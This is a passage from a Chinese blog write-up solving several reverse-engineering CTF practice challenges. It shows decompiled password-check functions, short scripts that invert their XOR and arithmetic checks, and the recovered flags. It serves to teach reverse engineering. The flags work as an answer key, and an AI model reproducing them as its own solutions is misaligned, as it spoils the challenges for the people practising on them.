key; *(_BYTE *)(a2 + i) = v5[i]; *(_BYTE *)(a2 + i + 1LL) = v4[i + 1]; *(_BYTE *)(a2 + i + 2LL) = v3[i + 2]; } return a2;} 这里进行了一些运算，运算的结果要和一个已经定义的enflag字符串相同，所以很好逆，这里需要注意运算顺序，异或运算加括号，不然会先计算加减 #include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { int key = 0x12; unsigned char a2[] = { 0x69, 0x7A, 0x77, 0x68, 0x72, 0x6F, 0x7A, 0x22, 0x22, 0x77, 0x22, 0x76, 0x2E, 0x4B, 0x22, 0x2E, 0x4E, 0x69 }; char a1[key+1]; for (int i = 0; i &lt; key; i += 3 ) { a1[i]=(a2[i]^key)-6; a1[i+1]=(a2[i+1]^key)+6; a1[i+2]=a2[i+2]^key^6; } cout&lt;&lt;a1&lt;&lt;endl; return 0;} 输出的flag为： unctf{b66_6b6_66b} Reversing-x64Elf-100没什么难度，找到关键函数 signed __int64 __fastcall sub_4006FD(__int64 a1){ signed int i; // [rsp+14h] [rbp-24h] const char *v3; // [rsp+18h] [rbp-20h] const char *v4; // [rsp+20h] [rbp-18h] const char *v5; // [rsp+28h] [rbp-10h] v3 = \"Dufhbmf\"; v4 = \"pG`imos\"; v5 = \"ewUglpt\"; for ( i = 0; i &lt;= 11; ++i ) { if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + a1) != 1 ) return 1LL; } return 0LL;} a1就是我们需要的flag了 #include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { char v3[3][8] = {\"Dufhbmf\", \"pG`imos\", \"ewUglpt\"}; char a1[13]; for (int i = 0; i &lt;= 11; ++i) { a1[i] = v3[i % 3][2 * (i / 3)] - 1; } cout&lt;&lt;a1&lt;&lt;endl; return 0;} 输出的flag为： Code_Talkers IgniteMeIDA打开，首先发现flag的格式，EIS{***} 找到关键函数 bool __cdecl sub_4011C0(char *a1){ size_t v2; // eax signed int v3; // [esp+50h] [ebp-B0h] char v4[32]; // [esp+54h] [ebp-ACh] int v5; // [esp+74h] [ebp-8Ch] int v6; // [esp+78h] [ebp-88h] size_t i; // [esp+7Ch] [ebp-84h] char v8[128]; // [esp+80h] [ebp-80h] if ( strlen(a1) &lt;= 4 ) return 0; i = 4; v6 = 0; while ( i &lt; strlen(a1) - 1 ) v8[v6++] = a1[i++]; v8[v6] = 0; v5 = 0; v3 = 0; // v8=a1 memset(v4, 0, 0x20u); for ( i = 0; ; ++i ) { v2 = strlen(v8); if ( i &gt;= v2 ) break; if ( v8[i] &gt;= 'a' &amp;&amp; v8[i] &lt;= 'z' ) { v8[i] -= 32; v3 = 1; } if ( !v3 &amp;&amp; v8[i] &gt;= 'A' &amp;&amp; v8[i] &lt;= 'Z' ) v8[i] += 32; //大小写互换 v4[i] = byte_4420B0[i] ^ sub_4013C0(v8[i]); //唯一一步有用的计算 v3 = 0; } return strcmp(\"GONDPHyGjPEKruv{{pj]X@rF\", v4) == 0; 据此写脚本逆向 #include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { string v4=\"GONDPHyGjPEKruv{{pj]X@rF\"; unsigned char byte_4420B0[] = { 13, 19, 23, 17, 2, 1, 32, 29, 12, 2, 25, 47, 23, 43, 36, 31, 30, 22, 9, 15, 21, 39, 19, 38, 10, 47, 30, 26, 45, 12, 34, 4 }; char v8[v4.length()]; for (int i = 0;i&lt;v4.length() ; ++i ) { v8[i]=((v4[i]^byte_4420B0[i])-72)^0x55; if ( v8[i] &gt;= 'a' &amp;&amp; v8[i] &lt;= 'z' ) { v8[i] -= 32; } else if(v8[i] &gt;= 'A' &amp;&amp; v8[i] &lt;= 'Z'){ v8[i] += 32; } else{ continue; } } cout&lt;&lt;v8&lt;&lt;endl; return 0;} 把输出和我们已知的部分结合起来得到flag EIS{wadx_tdgk_aihc_ihkn_pjlm} hackme通过字符串找到关键部分 __int64 __fastcall sub_400F8E(__int64 a1, __int64 a2){ __int64 v2; // rdx __int64 v3; // rcx __int64 v4; // r8 __int64 v5; // r9 int index; // eax char v8[136]; // [rsp+10h] [rbp-B0h] int v9; // [rsp+98h] [rbp-28h] char v10; // [rsp+9Fh] [rbp-21h] int v11; // [rsp+A0h] [rbp-20h] unsigned __int8 v12; // [rsp+A6h] [rbp-1Ah] char v13; // [rsp+A7h] [rbp-19h] int v14; // [rsp+A8h] [rbp-18h] int v15; // [rsp+ACh] [rbp-14h] unsigned int v16; // [rsp+B0h] [rbp-10h] int v17; // [rsp+B4h] [rbp-Ch] _BOOL4 v18; // [rsp+B8h] [rbp-8h] int i; // [rsp+BCh] [rbp-4h] printf((unsigned __int64)\"Give me the password: \"); scanf((__int64)\"%s\", v8, a2); for ( i = 0; v8[i]; ++i ) ; v18 = i == 22; v17 = 10; do { index = rand((__int64)\"%s\", (__int64)v8, v2, v3, v4, v5); v3 = (unsigned int)(index % 22); v14 = index % 22; v16 = 0; v13 = byte_6B4270[index % 22]; v12 = v8[index % 22]; v11 = index % 22 + 1; v15 = 0; while ( v15 &lt; v11 ) { ++v15; v16 = 1828812941 * v16 + 12345; } v2 = v16; v10 = v16 ^ v12; if ( v13 != ((unsigned __int8)v16 ^ v12) ) v18 = 0; --v17; } while ( v17 ); if ( v18 ) v9 = printf((unsigned __int64)\"Congras\\n\"); else v9 = printf((unsigned __int64)\"Oh no!\\n\"); return 0LL;} 就是个简单的运算，写个脚本逆运算一下就出来了 #include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { unsigned char byte_6B4270[] = { 95, 242, 94, 139, 78, 14, 163, 170, 199, 147, 129, 61, 95, 116, 163, 9, 145, 43, 73, 40, 147, 103 }; char v13; char v12; char v8[23]; unsigned int v16=0; for(int i=0;i&lt;22;i++) { v16=0; v13=byte_6B4270[i]; int v11=i+1; int v15=0; while(v15&lt;v11){ ++v15; v16=1828812941 * v16 + 12345; } v8[i]=v13^v16; } cout&lt;&lt;v8&lt;&lt;endl; return 0;} 输出flag flag{d826e6926098ef46} easyre还是通过字符串找到关键函数 int sub_401080(){ unsigned int v0; // kr00_4 signed int v1; // edx char *v2; // esi char v3; // al unsigned int v4; // edx int v5; // eax __int128 v7; // [esp+2h] [ebp-24h] __int64 v8; // [esp+12h] [ebp-14h] int v9; // [esp+1Ah] [ebp-Ch] __int16 v10; // [esp+1Eh] [ebp-8h] printf(\"input：\", v7); v9 = 0; v10 = 0; v7 = 0i64; v8 = 0i64; scanf((const char *)&amp;dword_402158, (unsigned int)&amp;v7); v0 = strlen((const char *)&amp;v7); if ( v0 &gt;= 16 &amp;&amp; v0 == 24 ) // flag共24位 { v1 = 0; v2 = (char *)&amp;v8 + 7; do { v3 = *v2--; byte_40336C[v1++] = v3; // 输入的flag倒序 } while ( v1 &lt; 24 ); v4 = 0; do { byte_40336C[v4] = (byte_40336C[v4] + 1) ^ 6; ++v4; } while ( v4 &lt; 24 ); v5 = strcmp(byte_40336C, \"xIrCj~&lt;r|2tWsv3PtI\\x7Fzndka\"); if ( v5 ) v5 = -(v5 &lt; 0) | 1; if ( !v5 ) { printf(\"right\\n\", v7); system(\"pause\"); } } return 0;} 里面的算法变得复杂而毫无意义，真正实现的功能就两个，首先将输入的字符串逆序，然后进行一个变换，最后得到已知的字符串 target='xIrCj~&lt;r|2tWsv3PtI\\x7Fzndka'flag=''for i in target: flag+=chr((ord(i)^6)-1)print(flag[::-1]) 输出flag flag{xNqU4otPq3ys9wkDsN} shuffle打开把所有的整数转换为字符就看到了flag SECCON{Welcome to the SECCON 2014 CTF!} re-for-50-plz-50这题是mips，IDA直接反编译不出来，mips指令学的也不是很好，所以直接用retdec插件 retdec直接反编译出来 int main(int argc, char ** argv) { // 0x401398 for (int32_t i = 0; i &lt; 31; i++) { char v1 = *(char *)(i + (int32_t)\"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ\"); // 0x4013d8 char v2 = *(char *)(*(int32_t *)((int32_t)argv + 4) + i); // 0x4013f0 if ((int32_t)v1 != ((int32_t)v2 ^ 55)) { // 0x401408 print(); exit_funct(); } } // 0x401444 exit_funct(); return 1;} 可以发现只有一个异或操作 target=\"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ\"flag=''for i in target: flag+=chr((ord(i)^55))print(flag) 输出flag TUCTF{but_really_whoisjohngalt} parallel-comparator-200代码审计，直接给出了源码 #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#define FLAG_LEN 20void * checking(void *arg) { char *result = malloc(sizeof(char)); char *argument = (char *)arg; *result = (argument[0]+argument[1]) ^ argument[2]; return result;}int highly_optimized_parallel_comparsion(char *user_string){ int initialization_number; int i; char generated_string[FLAG_LEN + 1]; generated_string[FLAG_LEN] = '\\0'; while ((initialization_number = random()) &gt;= 64); int first_letter; first_letter = (initialization_number % 26) + 97; pthread_t thread[FLAG_LEN]; char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7}; char *arguments[20]; for (i = 0; i &lt; FLAG_LEN; i++) { arguments[i] = (char *)malloc(3*sizeof(char)); arguments[i][0] = first_letter; arguments[i][1] = differences[i]; arguments[i][2] = user_string[i]; pthread_create((pthread_t*)(thread+i), NULL, checking, arguments[i]); } void *result; int just_a_string[FLAG_LEN] = {115, 116, 114, 97, 110, 103, 101, 95, 115, 116, 114, 105, 110, 103, 95, 105, 116, 95, 105, 115}; for (i = 0; i &lt; FLAG_LEN; i++) { pthread_join(*(thread+i), &amp;result); generated_string[i] = *(char *)result + just_a_string[i]; free(result); free(arguments[i]); } int is_ok = 1; for (i = 0; i &lt; FLAG_LEN; i++) { if (generated_string[i] != just_a_string[i]) return 0; } return 1;}int main(){ char *user_string = (char *)calloc(FLAG_LEN+1, sizeof(char)); fgets(user_string, FLAG_LEN+1, stdin); int is_ok = highly_optimized_parallel_comparsion(user_string); if (is_ok) printf(\"You win!\\n\"); else printf(\"Wrong!\\n\"); return 0;} 源码比较长，但是做的事情不多，需要注意三个函数的用法 第一个是pthread_create()用来创建一个新的线程 int pthread_create(pthread_t *tidp,const pthread_attr_t *attr,(void*)(*start_rtn)(void*),void *arg); 几个参数分别是，指向线程的指针，线程的属性，调用的函数和参数，在这段代码里实际上就是调用checking()函数，并把之前设定好的参数传给函数 第二个是pthread_join()用来传递返回结果 int pthread_join(pthread_t thread, void **retval); 所以result就是指向返回结果的指针，所以最终的目的就是让checking()函数返回的值为0 第三个是random()函数，在这之前没有用随机种子初始化生成器，所以随机数生成的结果不管怎么运行都是一样的，但是需要注意linux下random()和windows下rand()生成的数据并不一样 此外还需要注意一点，在c++里面，赋值语句的返回值是赋的值而不是布尔值 所以只需要根据checking()函数来逆向运算一下就可以得到结果了 #include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;#define FLAG_LEN 20using namespace std;int main() { char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7}; int first_letter; first_letter = 108; char flag[FLAG_LEN]; for (int i = 0; i &lt; FLAG_LEN; i++) { flag[i] = first_letter + differences[i]; } cout &lt;&lt; flag &lt;&lt; endl; return 0;} 输出flag lucky_hacker_you_are","link":"/2020/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"re","slug":"re","link":"/tags/re/"},{"name":"BUUCTF","slug":"BUUCTF","link":"/tags/BUUCTF/"},{"name":"CG-CTF","slug":"CG-CTF","link":"/tags/CG-CTF/"},{"name":"hgame","slug":"hgame","link":"/tags/hgame/"},{"name":"攻防世界","slug":"攻防世界","link":"/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"bugku","slug":"bugku","link":"/tags/bugku/"}],"categories":[]}